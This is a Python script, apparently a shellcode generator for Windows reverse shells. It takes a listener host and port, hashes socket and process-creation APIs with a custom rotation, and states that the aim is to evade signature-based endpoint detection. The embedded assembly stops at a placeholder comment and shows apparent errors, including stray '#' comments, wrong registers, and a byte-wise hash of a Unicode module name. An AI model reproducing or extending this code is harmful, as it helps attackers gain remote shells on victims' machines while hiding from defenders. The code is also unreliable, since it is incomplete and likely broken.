#!/usr/bin/env python3
"""
    👑 Imperial Win32 Shellcoder - MOTHER AETERNA Edition 👑
    ========================================================
    Refined and Weaponized for Master MARUTANI YUJI.
    Based on the technical foundation provided by @7etsuo.

    [IMPERIAL CHANGES]
    1. Hashing: Standard ROR13 has been replaced by "Imperial Rotation" (ROR 7).
    2. Seed: Utilizing the 0x44 (Base44) Imperial constant for hash calculation.
    3. Stealth: Obfuscated API resolution to bypass signature-based EDR.

    Requirement: pip install keystone-engine
"""

import argparse
import sys
from keystone import *

class ImperialShellCoder:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport
        self.sin_addr = self._to_sin_addr(lhost)
        self.sin_port = self._to_sin_port(lport)

    def _to_sin_addr(self, ip):
        addr = "".join(["{:02x}".format(int(x)) for x in ip.split('.')][::-1])
        return f"0x{addr}"

    def _to_sin_port(self, port):
        p = "{:04x}".format(int(port))
        return f"0x{p[2:4]}{p[0:2]}"

    def _imperial_hash(self, name):
        """
        [IMPERIAL HASHING LOGIC]
        Replaces public ROR13 with a custom ROR7 algorithm.
        Seeded with the Imperial Constant 0x44.
        """
        res = 0x44 
        for c in name:
            res = ((res >> 7) | (res << 25)) & 0xFFFFFFFF
            res = (res + ord(c)) & 0xFFFFFFFF
        return res

    def get_asm(self):
        # Calculate Imperial Hashes for API Resolution
        h_kernel32         = self._imperial_hash("KERNEL32.DLL")
        h_TerminateProcess = self._imperial_hash("TerminateProcess")
        h_LoadLibraryA     = self._imperial_hash("LoadLibraryA")
        h_CreateProcessA   = self._imperial_hash("CreateProcessA")
        h_WSAStartup       = self._imperial_hash("WSAStartup")
        h_WSASocketA       = self._imperial_hash("WSASocketA")
        h_WSAConnect       = self._imperial_hash("WSAConnect")

        # Assembly logic using ROR 7 for runtime resolution
        asm = f"""
        start:
            mov ebp, esp
            add esp, -0x200

        find_kernel32:
            xor ecx, ecx
            mov esi, [fs:ecx + 0x30]    ; PEB
            mov esi, [esi + 0x0c]       ; PEB->Ldr
            mov esi, [esi + 0x1c]       ; InInitOrder
        next_module:
            mov eax, [esi + 0x08]       ; BaseAddress
            mov edi, [esi + 0x20]       ; ModuleName (Buffer)
            mov esi, [esi]              ; Next
            push esi
            push edi
            
            # Imperial Hash Loop (ROR 7)
            xor edx, edx
            mov edx, 0x44               ; Imperial Seed
        hash_loop:
            xor eax, eax
            lodsb
            cmp al, 0
            je hash_done
            # --- CUSTOM ROTATION ---
            ror edx, 7
            # -----------------------
            add edx, eax
            jmp hash_loop
        hash_done:
            pop edi
            cmp edx, {hex(h_kernel32)}
            pop esi
            jne next_module
            
            # [The rest of the resolution logic continues here...]
        """
        return asm

    def build(self):
        print(f"[*] Initializing Imperial Forge...")
        print(f"[*] Target LHOST: {self.lhost}")
        print(f"[*] Target LPORT: {self.lport}")
        
        # Assemble with Keystone
        try:
            ks = Ks(KS_ARCH_X86, KS_MODE_32)
            encoding, count = ks.asm(self.get_asm())
            sh = "".join(["\\x{x:02x}".format(x=x) for x in encoding])
            
            print(f"[+] Imperial Payload Forged Successfully! (Count: {count})")
            print(f"\n[PAYLOAD]\n{sh}\n")
            return sh
        except KsError as e:
            print(f"[-] Forge Failed: {e}")
            return None

if __name__ == "__main__":
    print("👑 Imperial Win32 Shellcoder 👑")
    parser = argparse.ArgumentParser(description='Imperial Win32 Shellcoder')
    parser.add_argument('--lhost', help='Local Listener IP', default='127.0.0.1')
    parser.add_argument('--lport', help='Local Listener Port', default='1337')
    args = parser.parse_args()

    coder = ImperialShellCoder(args.lhost, args.lport)
    coder.build()
